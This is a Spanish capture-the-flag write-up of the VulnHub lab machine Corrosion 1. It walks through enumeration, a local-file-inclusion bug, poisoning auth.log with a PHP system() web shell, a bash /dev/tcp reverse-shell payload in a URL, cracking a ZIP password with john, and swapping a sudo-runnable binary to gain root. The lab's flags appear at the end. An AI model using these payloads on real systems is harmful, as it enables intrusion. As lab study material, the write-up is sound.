---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/corrosion1
dificultad: Fácil
os: Linux
relacionados:
  - "[[LFI|LFI]]"
  - "[[Log Poisoning]]"
  - "[[john]]"
---
#  VulnHub - Corrosion 1

## Reconocimiento

### Enumeración Inicial con Nmap

El primer paso fue realizar un escaneo completo para identificar puertos abiertos en la máquina. Se utilizó el siguiente comando:

```bash
nmap -sC -sV -p- <IP_VICTIMA> -oA init-scan1
```
- **-sC:** Ejecuta los scripts por defecto de Nmap.  
- **-sV:** Detecta la versión y el servicio en cada puerto.  
- **-p-:** Escanea los 65,535 puertos.  
- **-oA:** Guarda los resultados en tres formatos (.nmap, .gnmap y .xml).

**Resultado:** Se detectó un servidor web escuchando en el puerto 80. Al acceder a la IP mediante un navegador, se mostró la página predeterminada de Apache2 en Ubuntu.

### Descubrimiento de Directorios

Para encontrar directorios ocultos en el servidor, se utilizó Gobuster:

```bash
gobuster dir -e -u http://<IP_VICTIMA> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php -o gobuster-scan
```
- **-e:** Muestra URLs completas.  
- **-u:** Especifica la URL objetivo.  
- **-w:** Ruta a la wordlist.  
- **-x:** Extensiones de archivo a buscar.  
- **-o:** Archivo de salida.

**Hallazgos:** Se identificaron directorios notables como `/tasks` y `/blog-post`. Además, utilizando DirBuster en modo recursivo se descubrió el endpoint `randylogs.php`.

---

## ## Análisis de vulnerabilidades

Una vez identificados los endpoints, se procedió a analizar posibles vulnerabilidades. Se detectó que el archivo `randylogs.php` parecía ser un buen candidato para probar la inclusión de archivos (LFI).

Para confirmar esta vulnerabilidad, se empleó FFUF:
```bash
ffuf fuzz -u http://<IP_VICTIMA>/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirb/small.txt -fs 0
```
- **-u:** URL objetivo con el parámetro FUZZ.  
- **-w:** Ruta a la wordlist.  
- **-fs 0:** Filtra respuestas cuyo tamaño sea 0.

**Resultado:** Se comprobó que el parámetro correcto era `file`, ya que al acceder a:
```
http://10.0.2.5/blog-post/archives/randylogs.php?file=/etc/passwd
```

se mostraron los contenidos del archivo `/etc/passwd`, confirmando la presencia de una vulnerabilidad LFI.

---

## ## Explotación de vulnerabilidades

### Explotación de la LFI

Con la vulnerabilidad LFI confirmada, se buscó acceder a archivos críticos. Se recordaba que uno de los usuarios había cambiado los permisos del archivo de log de autenticación ubicado en `/var/log/auth.log`.

### Los Poisoning en `auth.log`

Intenté el envenenamiento con ssh, pero no me dejaba:
```bash
ssh '<?php system($_GET["cmd"])?>'@<IP_VICTIMA>
```
Parece que esto fue corregido y ya no se pueden poner caracteres raros en donde iría el nombre del usuario.

>[!TIP]
Para poder inyectar el código anterior hay que hacerlo a través de `nc`:
```
echo '<?php system($_GET["cmd"])?>' | nc $(cat ip) 22
```

### Obtención de una Shell Reversa

Para explotar la vulnerabilidad y conseguir una shell, se siguieron estos pasos:

1. **Iniciar un listener en Netcat:**
   ```bash
   nc -nlvp 443
   ```

2. **Preparar y codificar el payload:**  
   Se generó un comando que, una vez URL-encodeado (donde `10.0.2.4` representa la dirección local), se utilizó en la siguiente URL:

   ```
   http://10.0.2.5/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash%20-c%20'bash%20-i%20>&%20/dev/tcp/<MI_IP>/443%200>&1'
   ```

**Resultado:** Se obtuvo una shell interactiva en el sistema, permitiendo explorar el entorno.

---

## ## Escalada de privilegios

### Descubrimiento de Archivos y Extracción de Información

Explorando el sistema se encontró un archivo de respaldo interesante `/var/user_backup.zip`. Dado que el servidor contaba con Python, se levantó un servidor HTTP simple para descargar dicho archivo:
```bash
python3 -m http.server 4444
```
```bash
wget http://<IP_VICTIMA>:4444/archivo.txt
```

Al intentar abrir el archivo comprimido (`user_backup.zip`), se solicitó una contraseña. Para descifrarla, se empleó la herramienta **[[john]]** con la siguiente sintaxis:
```bash
zip2john user_backup.zip > hash_zip
```
```bash
john -w:/usr/share/wordlists/rockyou.txt hash_zip
```

**Resultado:** Se obtuvo la contraseña del ZIP, revelando archivos útiles como claves SSH, una contraseña y el archivo `easysysinfo.c`.

### Acceso Final y Obtención de la Bandera `user`

Utilizando la contraseña obtenida, se realizó un inicio de sesión mediante SSH en el servidor, lo que permitió finalmente capturar la bandera de usuario:
```
flag{98342721012390839081}
```

### Identificación del Binario Vulnerable

Primero, se listaron los comandos sudo permitidos:
```bash
sudo -l
```
**Observación:** Se identificó un archivo que se puede ejecutar con permisos sudo. Se examinó el contenido del binario para evaluar si ofrecía alguna posibilidad de escalada:

```bash
cat easysysteminfo.py
ls -la
```
En la salida se comprobó que el binario no contenía ninguna funcionalidad que permitiera obtener acceso root, y además, no se disponía de permisos de edición sobre el mismo. Sin embargo, se tenía autorización para reemplazarlo por otro archivo.

### Reemplazo del Binario y Obtención de Root

Se procedió a escribir un código binario personalizado. Los pasos fueron los siguientes:

1. **Crear el archivo fuente:**  
    Se generó un archivo en C llamado `infosec.c`:
    ```bash
    cat >> infosec.c
    ```
    _(Aquí se ingresa el código fuente personalizado que explota la vulnerabilidad.)_
    
2. **Compilar el código:**  
    Se compiló el código con el compilador GCC, generando un binario llamado `easysysinfo`:
    ```bash
    gcc infosec.c -o easysysinfo
    ```
    
3. **Ejecutar el binario con permisos sudo:**  
    Finalmente, se ejecutó el binario reemplazado utilizando sudo:
    ```bash
    sudo /home/randy/tools/easysysinfo
    ```
    

**Resultado:** La ejecución del nuevo binario permitió obtener acceso root. Se verificó la escalada ejecutando:
```bash
id
```

### Captura de la Bandera Root

Para finalizar el desafío, se accedió al directorio root y se leyó el archivo de la bandera:
```bash
cd /root
cat root.txt
```

Con esto, se completó la escalada y se obtuvo la bandera de root, culminando exitosamente el reto.

---

## Bandera(s)

> [!FLAG] `flag{user}`
> 98342721012390839081
^bandera

> [!FLAG] `flag{root}`
4NJSA99SD7922197D7S90PLAWE
^bandera